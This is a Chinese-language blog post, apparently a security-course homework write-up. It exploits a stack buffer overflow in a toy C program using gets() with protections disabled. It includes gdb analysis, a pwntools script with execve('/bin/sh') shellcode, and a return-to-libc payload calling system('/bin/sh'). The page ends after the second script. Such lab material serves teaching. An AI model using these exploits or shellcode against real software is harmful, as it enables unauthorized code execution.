<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="bufoverflow, winxp,">










<meta name="description" content="栈溢出1. 存在漏洞的函数123456789101112stack_over.c#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;void success() &amp;#123; puts(&amp;quot;You Hava already controlled it.&amp;quot;); &amp;#125;void vulnerable() &amp;#123;  char s">
<meta name="keywords" content="bufoverflow, winxp">
<meta property="og:type" content="article">
<meta property="og:title" content="stackoverflow">
<meta property="og:url" content="http://yoursite.com/2019/04/26/2019-4-26-stackoverfolw/index.html">
<meta property="og:site_name" content="Challenge forever">
<meta property="og:description" content="栈溢出1. 存在漏洞的函数123456789101112stack_over.c#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;void success() &amp;#123; puts(&amp;quot;You Hava already controlled it.&amp;quot;); &amp;#125;void vulnerable() &amp;#123;  char s">
<meta property="og:locale" content="default">
<meta property="og:updated_time" content="2019-04-29T07:27:03.245Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="stackoverflow">
<meta name="twitter:description" content="栈溢出1. 存在漏洞的函数123456789101112stack_over.c#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;void success() &amp;#123; puts(&amp;quot;You Hava already controlled it.&amp;quot;); &amp;#125;void vulnerable() &amp;#123;  char s">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2019/04/26/2019-4-26-stackoverfolw/">





  <title>stackoverflow | Challenge forever</title>
  








</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Challenge forever</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">come on!</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            About
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/26/2019-4-26-stackoverfolw/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="YiXiangTianKai">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Challenge forever">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">stackoverflow</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-26T20:57:00+08:00">
                2019-04-26
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/homework/" itemprop="url" rel="index">
                    <span itemprop="name">-homework</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/04/26/2019-4-26-stackoverfolw/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2019/04/26/2019-4-26-stackoverfolw/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="page-pv"><i class="fa fa-file-o"></i> 阅读数
            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
            </span>
          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  2.9k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  14
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="1-存在漏洞的函数"><a href="#1-存在漏洞的函数" class="headerlink" title="1. 存在漏洞的函数"></a>1. 存在漏洞的函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">stack_over.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void success() &#123; puts(&quot;You Hava already controlled it.&quot;); &#125;</span><br><span class="line">void vulnerable() &#123;</span><br><span class="line">  char s[12];</span><br><span class="line">  gets(s);</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>gets 本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出，历史上，莫里斯蠕虫第一种蠕虫病毒就利用了 gets 这个危险函数实现了栈溢出。</p>
<h3 id="2-关闭相关保护机制"><a href="#2-关闭相关保护机制" class="headerlink" title="2. 关闭相关保护机制"></a>2. 关闭相关保护机制</h3><p>gcc 编译指令中，<code>-m32</code> 指的是生成 32 位程序，<code>-g</code>方便gdb调试。</p>
<ol>
<li><strong>关闭栈溢出保护</strong> <code>-fno-stack-protector</code> 指的是不开启堆栈溢出保护，即不生成 canary。 </li>
<li><strong>关闭 PIE</strong>（Position Independent Executable），避免加载基址被打乱。不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令gcc -v查看 gcc 默认的开关情况。如果含有–enable-default-pie参数则代表 PIE 默认已开启，需要在编译指令中添加参数<code>-no-pie</code>。</li>
<li><strong>关闭ASLR</strong> <code># echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>(需要在root环境下)。Linux 平台下还有地址空间分布随机化（ASLR）的机制,简单来说即使可执行文件开启了 PIE 保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE 时基址不同）。我们可以通过修改 <code>/proc/sys/kernel/randomize_va_space</code> 来控制 ASLR 启动与否，具体的选项有<ul>
<li>0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。</li>
<li>1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。</li>
<li>2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。</li>
</ul>
</li>
<li><strong>关闭DEP</strong> 通过<code>-z execstack</code>关闭数据执行保护。</li>
</ol>
<p>编译：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">challenge@ubuntu:~/Desktop/Link to homework2/bufover$ gcc -m32 -g -fno-stack-protector -z execstack stack_over.c -o stack_overstack_over.c: In function ‘vulnerable’:stack_over.c:6:3: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]   gets(s);   ^/tmp/ccMXMZDo.o: In function `vulnerable&apos;:stack_over.c:(.text+0x27): warning: the `gets&apos; function is dangerous and should not be used.</span><br></pre></td></tr></table></figure>
<p>编译成功后，可以使用 checksec 工具检查编译出的文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤  checksec stack_over[+] checksec for &apos;/media/psf/Home/jn/spring-course/OS_security/homework2/bufover/stack_over&apos;Canary                        : NoNX                            : NoPIE                           : NoFortify                       : NoRelRO                         : Partial</span><br></pre></td></tr></table></figure>
<h3 id="3-分析程序溢出点"><a href="#3-分析程序溢出点" class="headerlink" title="3. 分析程序溢出点"></a>3. 分析程序溢出点</h3><p>查看代码段信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -d stack_over</span><br><span class="line">0804843b &lt;success&gt;: 804843b:	55                   	push   %ebp 804843c:	89 e5                	mov    %esp,%ebp 804843e:	83 ec 08             	sub    $0x8,%esp 8048441:	83 ec 0c             	sub    $0xc,%esp 8048444:	68 10 85 04 08       	push   $0x8048510 8048449:	e8 c2 fe ff ff       	call   8048310 &lt;puts@plt&gt; 804844e:	83 c4 10             	add    $0x10,%esp 8048451:	90                   	nop 8048452:	c9                   	leave   8048453:	c3                   	ret    08048454 &lt;vulnerable&gt;: 8048454:	55                   	push   %ebp 8048455:	89 e5                	mov    %esp,%ebp 8048457:	83 ec 18             	sub    $0x18,%esp 804845a:	83 ec 0c             	sub    $0xc,%esp 804845d:	8d 45 ec             	lea    -0x14(%ebp),%eax 8048460:	50                   	push   %eax 8048461:	e8 9a fe ff ff       	call   8048300 &lt;gets@plt&gt; 8048466:	83 c4 10             	add    $0x10,%esp 8048469:	90                   	nop 804846a:	c9                   	leave   804846b:	c3                   	ret    0804846c &lt;main&gt;: 804846c:	8d 4c 24 04          	lea    0x4(%esp),%ecx 8048470:	83 e4 f0             	and    $0xfffffff0,%esp 8048473:	ff 71 fc             	pushl  -0x4(%ecx) 8048476:	55                   	push   %ebp 8048477:	89 e5                	mov    %esp,%ebp 8048479:	51                   	push   %ecx 804847a:	83 ec 04             	sub    $0x4,%esp 804847d:	e8 d2 ff ff ff       	call   8048454 &lt;vulnerable&gt; 8048482:	b8 00 00 00 00       	mov    $0x0,%eax 8048487:	83 c4 04             	add    $0x4,%esp 804848a:	59                   	pop    %ecx 804848b:	5d                   	pop    %ebp 804848c:	8d 61 fc             	lea    -0x4(%ecx),%esp 804848f:	c3                   	ret</span><br></pre></td></tr></table></figure>
<p>可以看到，在0x8048461调用gets函数，开启gdb调试，在gets函数下断点单步调试，观察程序运行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gdb stack_overGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1</span><br><span class="line">gef➤  b *0x8048461Breakpoint 1 at 0x8048461: file stack_over.c, line 6.gef➤  rStarting program: /media/psf/Home/jn/spring-course/OS_security/homework2/bufover/stack_over Breakpoint 1, 0x08048461 in vulnerable () at stack_over.c:66	  gets(s);──────────────────────────────────────────── code:x86:32 ────    0x8048459 &lt;vulnerable+5&gt;   sbb    BYTE PTR [ebx+0x458d0cec], al    0x804845f &lt;vulnerable+11&gt;  in     al, dx    0x8048460 &lt;vulnerable+12&gt;  push   eax →  0x8048461 &lt;vulnerable+13&gt;  call   0x8048300 &lt;gets@plt&gt;   ↳   0x8048300 &lt;gets@plt+0&gt;     jmp    DWORD PTR ds:0x804a00c       0x8048306 &lt;gets@plt+6&gt;     push   0x0       0x804830b &lt;gets@plt+11&gt;    jmp    0x80482f0       0x8048310 &lt;puts@plt+0&gt;     jmp    DWORD PTR ds:0x804a010       0x8048316 &lt;puts@plt+6&gt;     push   0x8       0x804831b &lt;puts@plt+11&gt;    jmp    0x80482f0──────────────────────────────────── arguments (guessed) ────gets@plt (   [sp + 0x0] = 0xffffcf94 → 0x00000003,   [sp + 0x4] = 0xf7fb4000 → 0x001afdb0,   [sp + 0x8] = 0xf7fb2244 → 0xf7e1c020 →  call 0xf7f21289)────────────────────────────────── source:stack_over.c+6 ────      1	 #include &lt;stdio.h&gt;      2	 #include &lt;string.h&gt;      3	 void success() &#123; puts(&quot;You Hava already controlled it.&quot;); &#125;      4	 void vulnerable() &#123;      5	   char s[12];           // s=0xffffcf94  →  0x00000003 →    6	   gets(s);      7	 &#125;      8	 int main(int argc, char **argv) &#123;      9	   vulnerable();     10	   return 0;     11	 &#125;</span><br></pre></td></tr></table></figure>
<p>程序在<code>call   0x8048300 &lt;gets@plt&gt;</code>停下，<code>ni</code>指令单步执行，输入30个a测试，继续调试到 <code>0x804846b &lt;vulnerable+23&gt;  ret</code>，观察寄存器和栈。</p>
<p><em>ret 指令相当于 pop eip。即，首先将 esp 指向的 4 字节内容读取并赋值给 eip，然后 esp 加上 4 字节指向栈的下一个位置。</em></p>
<p>因此esp指向的4字节0xffffcfac的内容“aaaa”（0x61616161）将赋值给eip，<code>[!] Cannot disassemble from $PC</code>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  niaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa          ─────────────────────────────────────────────────────────────gef➤  ni7	&#125;[ Legend: Modified register | Code | Heap | Stack | String ]────────────────────────────────────────────── registers ────$eax   : 0xffffcf94  →  &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;$ebx   : 0x0       $ecx   : 0xf7fb45a0  →  0xfbad2288$edx   : 0xf7fb587c  →  0x00000000$esp   : 0xffffcf90  →  0x00000001$ebp   : 0xffffcfa8  →  &quot;aaaaaaaaaa&quot;$esi   : 0xf7fb4000  →  0x001afdb0$edi   : 0xf7fb4000  →  0x001afdb0$eip   : 0x08048469  →  &lt;vulnerable+21&gt; nop $eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ────────────────────────────────────────────────── stack ────0xffffcf90│+0x0000: 0x00000001	 ← $esp0xffffcf94│+0x0004: &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;0xffffcf98│+0x0008: &quot;aaaaaaaaaaaaaaaaaaaaaaaaaa&quot;0xffffcf9c│+0x000c: &quot;aaaaaaaaaaaaaaaaaaaaaa&quot;0xffffcfa0│+0x0010: &quot;aaaaaaaaaaaaaaaaaa&quot;0xffffcfa4│+0x0014: &quot;aaaaaaaaaaaaaa&quot;0xffffcfa8│+0x0018: &quot;aaaaaaaaaa&quot;	 ← $ebp0xffffcfac│+0x001c: &quot;aaaaaa&quot;──────────────────────────────────────────── code:x86:32 ────    0x8048460 &lt;vulnerable+12&gt;  push   eax    0x8048461 &lt;vulnerable+13&gt;  call   0x8048300 &lt;gets@plt&gt;    0x8048466 &lt;vulnerable+18&gt;  add    esp, 0x10 →  0x8048469 &lt;vulnerable+21&gt;  nop        0x804846a &lt;vulnerable+22&gt;  leave      0x804846b &lt;vulnerable+23&gt;  ret        0x804846c &lt;main+0&gt;         lea    ecx, [esp+0x4]    0x8048470 &lt;main+4&gt;         and    esp, 0xfffffff0    0x8048473 &lt;main+7&gt;         push   DWORD PTR [ecx-0x4]</span><br><span class="line">```这里可以看到栈的结构，缓冲区从0xffffcf94开始，ebp 在偏移0x14之后的0xffffcfa8位置，ret 在ebp之后的4个字节0xffffcfac位置。</span><br></pre></td></tr></table></figure>
<pre><code>                   +-----------------+
                   |     retaddr     |
ret, 0xffffcfac---&gt;+-----------------+
                   |     saved ebp   |
ebp, 0xffffcfa8---&gt;+-----------------+
                   |                 |
                   |                 |
                   |                 |
                   |                 |
                   |                 |
                   |                 |
   s, 0xffffcf94--&gt;+-----------------+
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">```gef➤  ni────────────────────────────────────────────── registers ────$eax   : 0xffffcf94  →  &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;$ebx   : 0x0       $ecx   : 0xf7fb45a0  →  0xfbad2288$edx   : 0xf7fb587c  →  0x00000000$esp   : 0xffffcfac  →  &quot;aaaaaa&quot;$ebp   : 0x61616161 (&quot;aaaa&quot;?)$esi   : 0xf7fb4000  →  0x001afdb0$edi   : 0xf7fb4000  →  0x001afdb0$eip   : 0x0804846b  →  &lt;vulnerable+23&gt; ret $eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ────────────────────────────────────────────────── stack ────0xffffcfac│+0x0000: &quot;aaaaaa&quot;	 ← $esp0xffffcfb0│+0x0004: 0xf7006161 (&quot;aa&quot;?)0xffffcfb4│+0x0008: 0xffffcfd0  →  0x000000010xffffcfb8│+0x000c: 0x000000000xffffcfbc│+0x0010: 0xf7e1c637  →  &lt;__libc_start_main+247&gt; add esp, 0x100xffffcfc0│+0x0014: 0xf7fb4000  →  0x001afdb00xffffcfc4│+0x0018: 0xf7fb4000  →  0x001afdb00xffffcfc8│+0x001c: 0x00000000──────────────────────────────────────────── code:x86:32 ────    0x8048462 &lt;vulnerable+14&gt;  call   0x10c4:0x83fffffe    0x8048469 &lt;vulnerable+21&gt;  nop        0x804846a &lt;vulnerable+22&gt;  leave   →  0x804846b &lt;vulnerable+23&gt;  ret    [!] Cannot disassemble from $PC</span><br></pre></td></tr></table></figure>
<p>继续执行发现<code>[!] Cannot access memory at address 0x61616161</code>0x61616161内存地址不能被访问，程序崩溃。可以看到，执行ret指令之后esp加上4字节指向0xffffcfb0。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤  ni0x61616161 in ?? ()[ Legend: Modified register | Code | Heap | Stack | String ]────────────────────────────────────────────── registers ────$eax   : 0xffffcf94  →  &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;$ebx   : 0x0       $ecx   : 0xf7fb45a0  →  0xfbad2288$edx   : 0xf7fb587c  →  0x00000000$esp   : 0xffffcfb0  →  0xf7006161 (&quot;aa&quot;?)$ebp   : 0x61616161 (&quot;aaaa&quot;?)$esi   : 0xf7fb4000  →  0x001afdb0$edi   : 0xf7fb4000  →  0x001afdb0$eip   : 0x61616161 (&quot;aaaa&quot;?)$eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ────────────────────────────────────────────────── stack ────0xffffcfb0│+0x0000: 0xf7006161 (&quot;aa&quot;?)	 ← $esp0xffffcfb4│+0x0004: 0xffffcfd0  →  0x000000010xffffcfb8│+0x0008: 0x000000000xffffcfbc│+0x000c: 0xf7e1c637  →  &lt;__libc_start_main+247&gt; add esp, 0x100xffffcfc0│+0x0010: 0xf7fb4000  →  0x001afdb00xffffcfc4│+0x0014: 0xf7fb4000  →  0x001afdb00xffffcfc8│+0x0018: 0x000000000xffffcfcc│+0x001c: 0xf7e1c637  →  &lt;__libc_start_main+247&gt; add esp, 0x10──────────────────────────────────────────── code:x86:32 ────[!] Cannot disassemble from $PC[!] Cannot access memory at address 0x61616161</span><br></pre></td></tr></table></figure>
<h3 id="4-构造payload"><a href="#4-构造payload" class="headerlink" title="4. 构造payload"></a>4. 构造payload</h3><p><strong>分析：</strong>由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 shellcode_addr(0xffffcfb0)，并且在0xffffcfb0位置写上shellcode，那么在执行完ret指令之后 就会转到shellcode执行。前面又知道了ret相对偏移位置，因此 可以构造payload <code>&#39;a&#39; * 0x14 + &#39;bbbb&#39; + p32(shell_addr) + shellcode</code>。此时栈的结构是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">                         +-----------------+</span><br><span class="line">                         |                 |</span><br><span class="line">                         |                 |</span><br><span class="line">                         |                 |</span><br><span class="line">                         |    shellcode    |</span><br><span class="line">shellcode, 0xffffcfb0---&gt;+-----------------+</span><br><span class="line">                         |    0xffffcfb0   |</span><br><span class="line">      ret, 0xffffcfac---&gt;+-----------------+</span><br><span class="line">                         |      bbbb       |</span><br><span class="line">      ebp, 0xffffcfa8---&gt;+-----------------+</span><br><span class="line">                         |                 |</span><br><span class="line">                         |                 |</span><br><span class="line">                         |                 |</span><br><span class="line">                         |                 |</span><br><span class="line">                         |                 |</span><br><span class="line">                         |                 |</span><br><span class="line">         s, 0xffffcf94--&gt;+-----------------+</span><br></pre></td></tr></table></figure>
<p>但是需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 <code>0xffffcfb0</code> 在内存中的形式是</p>
<p><code>\xb0\xcf\xff\xff</code></p>
<p>但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \，x 等也算一个单独的字符。。所以我们需要想办法将 \x3b 作为一个字符输入进去。那么此时我们就需要使用 pwntools 了 ，这里利用 pwntools 的代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exp_shell.py </span><br><span class="line">##coding=utf8from pwn import *## 构造与程序交互的对象sh = process(&apos;./stack_over&apos;)shell_addr = 0xffffcfb0shellcode = &apos;\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42&apos;## 构造payloadpayload = &apos;a&apos; * 0x14 + &apos;bbbb&apos; + p32(shell_addr) + shellcodeprint (p32(shell_addr))## 向程序发送字符串raw_input()sh.sendline(payload)## 将代码交互转换为手工交互sh.interactive()</span><br></pre></td></tr></table></figure>
<p>shellcode使用的网上现有的，功能是开启一个shell，如下可以看到测试成功。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python exp_shell.py [+] Starting local process &apos;./stack_over&apos;: pid 25993����[*] Switching to interactive mode$ whoamichallenge$ exit[*] Got EOF while reading in interactive$ [*] Process &apos;./stack_over&apos; stopped with exit code 0 (pid 25993)[*] Got EOF while sending in interactive</span><br></pre></td></tr></table></figure>
<h3 id="5-return2libc"><a href="#5-return2libc" class="headerlink" title="5. return2libc"></a>5. return2libc</h3><p>如果开启DEP，发现此攻击并不能成功，因为shellcode是在栈上，是不能执行的。现在我们把DEP打开，依然关闭stack protector和ASLR。编译方法如下：</p>
<p><code>$ gcc -m32 -g -fno-stack-protector stack_over.c -o stack_over1</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤  checksec[+] checksec for &apos;/media/psf/Home/jn/spring-course/OS_security/homework2/bufover/stack_over1&apos;Canary                        : NoNX                            : YesPIE                           : NoFortify                       : NoRelRO                         : Partial</span><br></pre></td></tr></table></figure>
<p>我们知道stack_over调用了libc.so，并且libc.so里保存了大量可利用的函数，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。那么接下来的问题就是如何得到system()这个函数的地址以及”/bin/sh”这个字符串的地址。</p>
<p>如果关掉了ASLR的话，system()函数在内存中的地址是不会变化的，并且libc.so中也包含”/bin/sh”这个字符串，并且这个字符串的地址也是固定的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b mainBreakpoint 1 at 0x804847d: file stack_over.c, line 9.gef➤  rStarting program: /media/psf/Home/jn/spring-course/OS_security/homework2/bufover/stack_over gef➤  p system$3 = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e3e940 &lt;system&gt;</span><br><span class="line">gef➤  p exit$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e327b0 &lt;exit&gt;gef➤  p __libc_start_main$4 = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e1c540 &lt;__libc_start_main&gt;gef➤  find 0xf7e1c540, +2200000, &quot;/bin/sh&quot;0xf7f5d02bwarning: Unable to access 16000 bytes of target memory at 0xf7fb6db3, halting search.1 pattern found.gef➤  x/s 0xf7f5d02b0xf7f5d02b:	&quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure>
<p>我们首先在main函数上下一个断点，然后执行程序，这样的话程序会加载libc.so到内存中，然后我们就可以通过<code>p system</code>这个命令来获取system函数在内存中的位置，通过<code>p exit</code>这个命令来获取exit函数在内存中的位置，随后我们可以通过<code>p __libc_start_main</code>这个命令来获取libc.so在内存中的起始位置，接下来我们可以通过find命令来查找<code>&quot;/bin/sh&quot;</code>这个字符串。这样我们就得到了system的地址<code>0xf7e3e940</code>、exit的地址<code>0xf7e327b0</code>以及<code>&quot;/bin/sh&quot;</code>的地址<code>0xf7f5d02b</code>.</p>
<p><strong>构造payload</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exp_shell1.py </span><br><span class="line"></span><br><span class="line">##coding=utf8from pwn import *## 构造与程序交互的对象sh = process(&apos;./stack_over1&apos;)system_addr = 0xf7e3e940exit_addr = 0xf7e327b0binsh_addr = 0xf7f5d02b## 构造payloadpayload = &apos;a&apos; * 0x14 + &apos;bbbb&apos; + p32(system_addr) + p32(exit_addr) + p32(binsh_addr)## 向程序发送字符串raw_input()sh.sendline(payload)## 将代码交互转换为手工交互sh.interactive()</span><br></pre></td></tr></table></figure>
<p>测试成功：</p>
